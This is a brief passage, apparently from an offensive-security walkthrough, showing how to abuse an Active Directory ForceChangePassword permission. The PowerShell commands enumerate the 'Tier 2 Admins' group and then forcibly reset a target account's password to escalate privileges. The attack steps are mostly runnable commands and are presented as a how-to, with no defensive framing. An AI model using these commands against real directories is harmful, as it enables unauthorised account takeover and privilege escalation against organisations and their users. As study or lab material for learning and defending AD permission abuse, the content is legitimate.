After we've then added ourselves to somewhere where we can leverage a 
permission, sometimes we can gain the forcechangepassword over a different
tier within the network, allowing us to reset a password and level up to 
the next levels of privileges. 

So, therefore, let's change a privilege!

Firstly, check into where you are trying to escalate to:

Get-ADGroupMember -Identity "Tier 2 Admins"

Then, we set a password variable:
$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force 

Then, set the password for the account target:
Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password

And then boom, we are now escalated.
